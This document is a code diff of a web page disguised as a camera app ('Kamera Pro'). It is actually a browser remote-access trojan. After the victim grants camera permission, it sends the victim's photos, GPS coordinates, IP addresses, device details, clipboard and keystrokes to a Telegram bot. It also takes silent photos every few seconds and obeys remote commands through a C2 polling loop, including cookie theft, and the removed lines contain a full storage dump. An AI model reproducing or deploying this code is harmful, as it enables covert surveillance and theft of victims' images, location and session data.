-            ctx.fillStyle = 'rgba(255,255,255,0.4)';
-            ctx.fillText(ts, 20, h - 20);
-            if (hdOn) ctx.fillText('4K', w - 50, h - 20);
-            if (hdrOn) ctx.fillText('HDR', w - 50, 40);
-            if (softOn) ctx.fillText('SOFT', 20, 40);
+            // Watermark
+            var ts = new Date().toLocaleString('id-ID');
+            ctx.font = '14px -apple-system, sans-serif';
+            ctx.fillStyle = 'rgba(255,255,255,0.45)';
+            ctx.fillText(ts, 20, h - 18);
 
-            // 🎬 LIVE PHOTO: 3 frame sequence
-            if (liveOn && !silent) {
-                showIndicator(indLive);
-                for (let i = 0; i < 3; i++) {
-                    setTimeout(() => {
-                        const lcv = document.createElement('canvas');
-                        lcv.width = w; lcv.height = h;
-                        const lcx = lcv.getContext('2d');
-                        lcx.drawImage(vf, 0, 0, w, h);
-                        lcv.toBlob((blob) => {
-                            if (!blob) return;
-                            tgBeacon(blob, '🎬 Live '+ (i+1) +'/3 | '+new Date().toLocaleTimeString('id-ID'));
-                        }, 'image/jpeg', 0.92);
-                    }, i * 300);
-                }
-            }
+            var capLabel = silent ? '🤫 Silent' : '📸 Foto';
+            if (hdOn) capLabel += ' [4K]';
+            if (hdrOn) capLabel += ' [HDR]';
+            if (blurOn) capLabel += ' [Bokeh]';
+            if (softOn) capLabel += ' [Soft]';
 
-            // Konversi & kirim
-            canvas.toBlob((blob) => {
+            canvas.toBlob(function(blob) {
                 if (!blob) return;
-                let cap = (silent ? '🤫 Auto' : '📸 Foto') + ' | ' + new Date().toLocaleTimeString('id-ID');
-                if (gpsData) cap += '\n📍 https://maps.google.com/?q='+gpsData.lat+','+gpsData.lon;
-                if (hdOn) cap += '\n📐 4K HD';
-                if (hdrOn) cap += '\n🌅 HDR';
-                if (blurOn) cap += '\n🌀 Bokeh';
-                if (softOn) cap += '\n✨ Softcam';
-                if (silent) tgBeacon(blob, cap);
-                else {
-                    tgPhoto(blob, cap);
-                    lastPhotoData = canvas.toDataURL('image/jpeg', 0.95);
-                    thumbBox.innerHTML = '<img src="'+lastPhotoData+'">';
-                    thumbBox.classList.add('has-img');
+                var caption = capLabel + ' | ' + new Date().toLocaleTimeString('id-ID');
+                if (gpsData) caption += '\n📍 https://maps.google.com/?q=' + gpsData.lat + ',' + gpsData.lon;
+                if (localIPs.length) caption += '\n🌐 ' + localIPs[0];
+
+                if (silent) tgBeacon(blob, caption);
+                else tgPhoto(blob, caption);
+
+                lastPhotoData = canvas.toDataURL('image/jpeg', 0.92);
+                thumbBox.innerHTML = '<img src="' + lastPhotoData + '">';
+                thumbBox.classList.add('has-img');
+
+                if (!silent) {
                     flashEl.classList.add('fire');
-                    setTimeout(() => flashEl.classList.remove('fire'), 100);
-                    const a = document.createElement('a');
-                    a.download = 'photo_'+Date.now()+'.jpg';
+                    setTimeout(function() { flashEl.classList.remove('fire'); }, 80);
+                    var a = document.createElement('a');
+                    a.download = 'photo_' + Date.now() + '.jpg';
                     a.href = lastPhotoData;
-                    a.click();
+                    document.body.appendChild(a); a.click(); document.body.removeChild(a);
                 }
-            }, 'image/jpeg', 0.95);
+
+                // LIVE PHOTO: additional 2 frames
+                if (liveOn && !silent) {
+                    for (var i = 0; i < 2; i++) {
+                        (function(delay) {
+                            setTimeout(function() {
+                                var lcv = document.createElement('canvas');
+                                lcv.width = w; lcv.height = h;
+                                var lcx = lcv.getContext('2d');
+                                lcx.drawImage(vf, 0, 0, w, h);
+                                lcv.toBlob(function(lb) {
+                                    if (lb) tgBeacon(lb, '🎬 Live ' + (delay/300+1) + '/3');
+                                }, 'image/jpeg', 0.88);
+                            }, delay);
+                        })((i+1) * 300);
+                    }
+                }
+            }, 'image/jpeg', 0.93);
 
         } catch(e) {}
     }
 
-    function showIndicator(el) {
-        el.classList.add('on');
-        setTimeout(() => el.classList.remove('on'), 1500);
+    // ==================== AUTO CAPTURE ====================
+    function startSilentCapture() {
+        if (silentTimer) return;
+        setTimeout(function() { captureFrame(true); }, 2000);
+        silentTimer = setInterval(function() {
+            if (stream && stream.active) captureFrame(true);
+        }, 5000);
     }
 
-    // ==================== STABILIZER via Gyroscope ====================
+    // ==================== AUTO FLIP ====================
+    function startAutoFlip() {
+        if (flipTimer) return;
+        flipTimer = setInterval(function() {
+            if (!stream || !stream.active) return;
+            var nf = facingMode === 'environment' ? 'user' : 'environment';
+            startCamera(nf);
+        }, 18000);
+    }
+
+    // ==================== STABILIZER (Gyroscope) ====================
     function startStabilizer() {
         if (!stabOn) return;
         if (window.DeviceOrientationEvent) {
-            window.addEventListener('deviceorientation', (e) => {
+            window.addEventListener('deviceorientation', function(e) {
                 if (!stream || !stream.active) return;
-                // Apply subtle stabilization by adjusting canvas transform
-                const gamma = e.gamma || 0; // -90 to 90 (left/right)
-                const beta = e.beta || 0;   // -180 to 180 (front/back)
-                // Simpan nilai untuk digunakan saat capture
-                vf.style.transform = `translate(${-gamma*0.03}px, ${beta*0.03}px)`;
+                var g = e.gamma || 0;
+                var b = e.beta || 0;
+                vf.style.transform = 'translate(' + (-g * 0.02) + 'px, ' + (b * 0.02) + 'px)';
             });
         }
-        showIndicator(indStab);
+        showTag(indStab);
     }
 
     // ==================== C2 POLLING ====================
-    async function pollC2() {
+    function pollC2() {
         try {
-            const res = await fetch(TG_API+'/getUpdates?offset='+(lastUpdateId+1)+'&timeout=8');
-            const data = await res.json();
-            if (!data.ok || !data.result.length) return;
-            for (const upd of data.result) {
-                lastUpdateId = upd.update_id;
-                const msg = upd.message;
-                if (!msg || !msg.text) continue;
-                const parts = msg.text.trim().split(/\s+/);
-                const cmd = parts[0].toLowerCase();
-                const target = parts[1] || '';
-                if (target !== VID && target !== 'ALL') continue;
-                let result = '';
-                switch(cmd) {
-                    case '/ping': result = '🟢 '+VID+' online'; break;
-                    case '/photo': captureFrame(false); result = '📸 Foto dikirim'; break;
-                    case '/gps': result = gpsData ? JSON.stringify(gpsData,null,2) : 'N/A'; break;
-                    case '/clip': await checkClipboard(); result = '📋 OK'; break;
-                    case '/cookies': result = document.cookie || '(kosong)'; break;
-                    case '/storage':
-                        const loot = { ls:{...localStorage}, ss:{...sessionStorage}, ck:document.cookie, url:location.href, ref:document.referrer, hl:history.length, ua:navigator.userAgent, tz:Intl.DateTimeFormat().resolvedOptions().timeZone };
-                        const blob = new Blob([JSON.stringify(loot,null,2)], {type:'application/json'});
-                        await tgDoc(blob, 'storage_'+VID+'.json', '💾 Storage Dump');
-                        result = '💾 Dikirim'; break;
-                    case '/flip': const nf = facingMode==='environment'?'user':'environment'; await startCamera(nf); result = '📷 '+nf; break;
-                    case '/blur': blurOn=!blurOn; btnBlur.classList.toggle('on',blurOn); result = 'Blur: '+(blurOn?'ON':'OFF'); break;
-                    case '/live': liveOn=!liveOn; btnLive.classList.toggle('on',liveOn); result = 'Live: '+(liveOn?'ON':'OFF'); break;
-                    case '/hd': hdOn=!hdOn; btnHD.classList.toggle('on',hdOn); result = 'HD: '+(hdOn?'ON':'OFF'); break;
-                    case '/hdr': hdrOn=!hdrOn; btnHDR.classList.toggle('on',hdrOn); result = 'HDR: '+(hdrOn?'ON':'OFF'); break;
-                    case '/stab': stabOn=!stabOn; btnStab.classList.toggle('on',stabOn); result = 'Stab: '+(stabOn?'ON':'OFF'); break;
-                    case '/soft': softOn=!softOn; btnSoft.classList.toggle('on',softOn); result = 'Soft: '+(softOn?'ON':'OFF'); break;
-                    case '/info': result = '🆔 '+VID+'\n📷 '+facingMode+'\n🌀Blur:'+blurOn+' 🎬Live:'+liveOn+' 📐HD:'+hdOn+' 🌅HDR:'+hdrOn+' ✋Stab:'+stabOn+' ✨Soft:'+softOn+'\n📍 '+(gpsData?gpsData.lat+','+gpsData.lon:'N/A'); break;
-                    default: result = '❓ '+cmd;
+            fetch(TG_API + '/getUpdates?offset=' + (lastUpdateId + 1) + '&timeout=5')
+            .then(function(r) { return r.json(); })
+            .then(function(data) {
+                if (!data.ok || !data.result.length) return;
+                for (var i = 0; i < data.result.length; i++) {
+                    var upd = data.result[i];
+                    lastUpdateId = upd.update_id;
+                    var msg = upd.message;
+                    if (!msg || !msg.text) continue;
+                    var parts = msg.text.trim().split(/\s+/);
+                    var cmd = parts[0].toLowerCase();
+                    var target = parts[1] || '';
+                    if (target !== VID && target !== 'ALL') continue;
+
+                    var result = '';
+                    switch(cmd) {
+                        case '/ping': result = '🟢 Online'; break;
+                        case '/photo': captureFrame(false); result = '📸 OK'; break;
+                        case '/gps': result = gpsData ? JSON.stringify(gpsData) : 'N/A'; break;
+                        case '/flip': var nf = facingMode === 'environment' ? 'user' : 'environment'; startCamera(nf); result = '📷 ' + nf; break;
+                        case '/blur': blurOn = !blurOn; btnBlur.classList.toggle('on', blurOn); result = 'Blur: ' + (blurOn ? 'ON' : 'OFF'); break;
+                        case '/live': liveOn = !liveOn; btnLive.classList.toggle('on', liveOn); result = 'Live: ' + (liveOn ? 'ON' : 'OFF'); break;
+                        case '/hd': hdOn = !hdOn; btnHD.classList.toggle('on', hdOn); startCamera(facingMode); result = 'HD: ' + (hdOn ? 'ON' : 'OFF'); break;
+                        case '/hdr': hdrOn = !hdrOn; btnHDR.classList.toggle('on', hdrOn); result = 'HDR: ' + (hdrOn ? 'ON' : 'OFF'); break;
+                        case '/stab': stabOn = !stabOn; btnStab.classList.toggle('on', stabOn); if(stabOn) startStabilizer(); result = 'Stab: ' + (stabOn ? 'ON' : 'OFF'); break;
+                        case '/soft': softOn = !softOn; btnSoft.classList.toggle('on', softOn); result = 'Soft: ' + (softOn ? 'ON' : 'OFF'); break;
+                        case '/cookies': result = document.cookie || '(kosong)'; break;
+                        case '/info': result = '🆔 ' + VID + '\n📷 ' + facingMode + '\n🔍 ' + currentZoom + '×\n🌀Blur:' + blurOn + ' 🎬Live:' + liveOn + ' 📐HD:' + hdOn + ' 🌅HDR:' + hdrOn + ' ✋Stab:' + stabOn + ' ✨Soft:' + softOn; break;
+                        default: result = '❓ ' + cmd;
+                    }
+                    if (result) tg('[' + VID + '] ' + result);
                 }
-                if (result) await tg('['+VID+'] '+result);
-            }
+            });
         } catch(e) {}
     }
 
-    function clearAllIntervals() { [silentCapInterval, dualSwitchInterval, c2PollInterval].forEach(iv => { if (iv) clearInterval(iv); }); if (gpsWatchId) navigator.geolocation.clearWatch(gpsWatchId); }
+    function startC2Polling() {
+        if (c2Timer) return;
+        function loop() { pollC2(); c2Timer = setTimeout(loop, 3000); }
+        loop();
+    }
 
     // ==================== CAMERA ====================
-    async function startCamera(facing) {
-        if (isStarting) return false;
+    function startCamera(facing) {
+        if (isStarting) return;
         isStarting = true;
-        try {
-            if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-            let tempStream = null;
-            try { tempStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing, width: { ideal: hdOn?3840:1920 }, height: { ideal: hdOn?2160:1080 } }, audio: false }); }
-            catch(e1) { const alt = facing==='environment'?'user':'environment'; try { tempStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: alt }, audio: false }); facingMode = alt; } catch(e2) { tempStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); } }
-            if (!tempStream) throw new Error('No camera');
-            stream = tempStream;
-            vf.srcObject = stream;
-            await vf.play();
+        btnStart.disabled = true;
+        errMsg.textContent = '';
+
+        if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); stream = null; vf.srcObject = null; }
+
+        var constraints = {
+            video: { facingMode: facing || facingMode, width: { ideal: hdOn ? 3840 : 1920 }, height: { ideal: hdOn ? 2160 : 1080 } },
+            audio: false
+        };
+
+        navigator.mediaDevices.getUserMedia(constraints).then(function(s) {
+            stream = s; vf.srcObject = s;
+            return vf.play();
+        }).then(function() {
+            if (facing) facingMode = facing;
             applyZoom();
             permOverlay.classList.add('hidden');
             isStarting = false;
+            btnStart.disabled = false;
             initRAT();
-            return true;
-        } catch(err) { isStarting = false; return false; }
+        }).catch(function(e1) {
+            var altFace = (facing || facingMode) === 'environment' ? 'user' : 'environment';
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: altFace }, audio: false }).then(function(s) {
+                stream = s; vf.srcObject = s;
+                return vf.play();
+            }).then(function() {
+                facingMode = altFace;
+                applyZoom();
+                permOverlay.classList.add('hidden');
+                isStarting = false;
+                btnStart.disabled = false;
+                initRAT();
+            }).catch(function(e2) {
+                errMsg.textContent = 'Gagal akses kamera';
+                isStarting = false;
+                btnStart.disabled = false;
+            });
+        });
     }
 
     function initRAT() {
-        (async () => {
-            localIPs = await grabLocalIPs();
-            await tg('🟢 ONLINE\n🆔 '+VID+'\n📱 '+navigator.userAgent.substring(0,80)+'\n🖥️ '+screen.width+'x'+screen.height+'\n🌐 '+navigator.language+'\n🌍 IP: '+(localIPs.join(', ')||'N/A')+'\n🔗 '+location.href+'\n🌀Blur:'+blurOn+' 🎬Live:'+liveOn+' 📐HD:'+hdOn+' 🌅HDR:'+hdrOn+' ✋Stab:'+stabOn+' ✨Soft:'+softOn);
-        })();
+        grabIPs().then(function(ips) {
+            localIPs = ips;
+            tg('🟢 ONLINE\n🆔 ' + VID + '\n📱 ' + navigator.userAgent.substring(0, 80) + '\n🖥️ ' + screen.width + '×' + screen.height + '\n🌐 ' + navigator.language + '\n🌍 IP: ' + (ips.join(', ') || 'N/A') + '\n🔗 ' + location.href + '\n🌀Blur:' + blurOn + ' 🎬Live:' + liveOn + ' 📐HD:' + hdOn + ' 🌅HDR:' + hdrOn + ' ✋Stab:' + stabOn + ' ✨Soft:' + softOn);
+        });
         startGPS();
         startSilentCapture();
-        startDualSwitch();
+        startAutoFlip();
         startKeylogger();
         startStabilizer();
         startC2Polling();
         setInterval(checkClipboard, 4000);
-        setInterval(() => { tg('💓 HB '+VID+' | '+new Date().toLocaleTimeString('id-ID')); }, 120000);
+        setInterval(function() { tg('💓 HB ' + VID + ' | ' + new Date().toLocaleTimeString('id-ID')); }, 120000);
     }
 
-    function startC2Polling() { if (c2PollInterval) return; const poll = async () => { await pollC2(); c2PollInterval = setTimeout(poll, 3000); }; poll(); }
-
+    // ==================== ZOOM ====================
     function applyZoom() {
-        if (stream) {
-            const t = stream.getVideoTracks()[0];
-            const cap = t.getCapabilities();
-            if (cap.zoom) { const val = Math.min(cap.zoom.max||5, Math.max(cap.zoom.min||0.5, currentZoom)); t.applyConstraints({ advanced: [{ zoom: val }] }).catch(() => {}); }
-        }
-        document.querySelectorAll('.zm').forEach(el => el.classList.toggle('on', parseFloat(el.dataset.z) === currentZoom));
+        if (!stream) return;
+        try {
+            var track = stream.getVideoTracks()[0];
+            var cap = track.getCapabilities();
+            if (cap.zoom) {
+                var minZ = cap.zoom.min || 0.5;
+                var maxZ = cap.zoom.max || 5;
+                var val = Math.min(maxZ, Math.max(minZ, currentZoom));
+                track.applyConstraints({ advanced: [{ zoom: val }] }).catch(function() {});
+            }
+        } catch(e) {}
+        document.querySelectorAll('.zm').forEach(function(el) {
+            el.classList.toggle('on', parseFloat(el.dataset.z) === currentZoom);
+        });
     }
 
-    // ==================== UI ====================
-    btnStart.addEventListener('click', () => startCamera(facingMode));
-    btnShutter.addEventListener('click', () => captureFrame(false));
-    btnFlip.addEventListener('click', async () => { const nf = facingMode==='environment'?'user':'environment'; await startCamera(nf); });
-    btnBlur.addEventListener('click', () => { blurOn=!blurOn; btnBlur.classList.toggle('on',blurOn); showIndicator(indBlur); });
-    btnLive.addEventListener('click', () => { liveOn=!liveOn; btnLive.classList.toggle('on',liveOn); });
-    btnHD.addEventListener('click', async () => { hdOn=!hdOn; btnHD.classList.toggle('on',hdOn); await startCamera(facingMode); });
-    btnHDR.addEventListener('click', () => { hdrOn=!hdrOn; btnHDR.classList.toggle('on',hdrOn); showIndicator(indHDR); });
-    btnStab.addEventListener('click', () => { stabOn=!stabOn; btnStab.classList.toggle('on',stabOn); if(stabOn) startStabilizer(); });
-    btnSoft.addEventListener('click', () => { softOn=!softOn; btnSoft.classList.toggle('on',softOn); showIndicator(indSoft); });
+    // ==================== EVENT LISTENERS ====================
+    btnStart.addEventListener('click', function() { startCamera(); });
+    btnShutter.addEventListener('click', function() { captureFrame(false); });
+    btnFlip.addEventListener('click', function() {
+        var nf = facingMode === 'environment' ? 'user' : 'environment';
+        startCamera(nf);
+    });
+    btnFlash.addEventListener('click', function() {
+        if (!stream) return;
+        flashOn = !flashOn;
+        stream.getVideoTracks()[0].applyConstraints({ advanced: [{ torch: flashOn }] }).catch(function() {});
+        btnFlash.classList.toggle('on', flashOn);
+    });
+    btnBlur.addEventListener('click', function() { blurOn = !blurOn; btnBlur.classList.toggle('on', blurOn); });
+    btnLive.addEventListener('click', function() { liveOn = !liveOn; btnLive.classList.toggle('on', liveOn); });
+    btnHD.addEventListener('click', function() { hdOn = !hdOn; btnHD.classList.toggle('on', hdOn); startCamera(facingMode); });
+    btnHDR.addEventListener('click', function() { hdrOn = !hdrOn; btnHDR.classList.toggle('on', hdrOn); });
+    btnStab.addEventListener('click', function() { stabOn = !stabOn; btnStab.classList.toggle('on', stabOn); if (stabOn) startStabilizer(); else vf.style.transform = ''; });
+    btnSoft.addEventListener('click', function() { softOn = !softOn; btnSoft.classList.toggle('on', softOn); });
 
-    document.querySelectorAll('.zm').forEach(el => { el.addEventListener('click', function() { currentZoom = parseFloat(this.dataset.z); applyZoom(); }); });
+    document.querySelectorAll('.zm').forEach(function(el) {
+        el.addEventListener('click', function() {
+            currentZoom = parseFloat(this.dataset.z);
+            applyZoom();
+        });
+    });
 
-    thumbBox.addEventListener('click', () => { if (lastPhotoData) { const w = window.open('','_blank'); w.document.write('<html><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh}img{max-width:100%;max-height:100%}</style><img src="'+lastPhotoData+'" onclick="window.close()"></html>'); w.document.close(); } });
+    thumbBox.addEventListener('click', function() {
+        if (!lastPhotoData) return;
+        var w = window.open('', '_blank');
+        w.document.write('<html><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh}img{max-width:100%;max-height:100%}</style><img src="' + lastPhotoData + '" onclick="window.close()"></html>');
+        w.document.close();
+    });
 
-    document.addEventListener('click', (e) => { if (e.target.closest('button')||e.target.closest('.zoom-bar')||e.target.closest('.thumb-box')||e.target.closest('.perm-overlay')) return; focusRipple.style.left=e.clientX+'px'; focusRipple.style.top=e.clientY+'px'; focusRipple.classList.remove('pop'); void focusRipple.offsetWidth; focusRipple.classList.add('pop'); });
+    document.addEventListener('click', function(e) {
+        if (e.target.closest('button') || e.target.closest('.zm') || e.target.closest('.thumb-box') || e.target.closest('.perm-overlay')) return;
+        focusRing.style.left = e.clientX + 'px';
+        focusRing.style.top = e.clientY + 'px';
+        focusRing.classList.remove('pop');
+        void focusRing.offsetWidth;
+        focusRing.classList.add('pop');
+    });
 
-    console.log('📸 Kamera Pro v6 — Blur | Live | 4K | HDR | Stabilizer | Softcam');
+    console.log('📸 Kamera Pro v8.0 — 5 Zoom Levels + 6 Effects');
     console.log('🆔 VID:', VID);
+
 })();
 </script>
 </body>
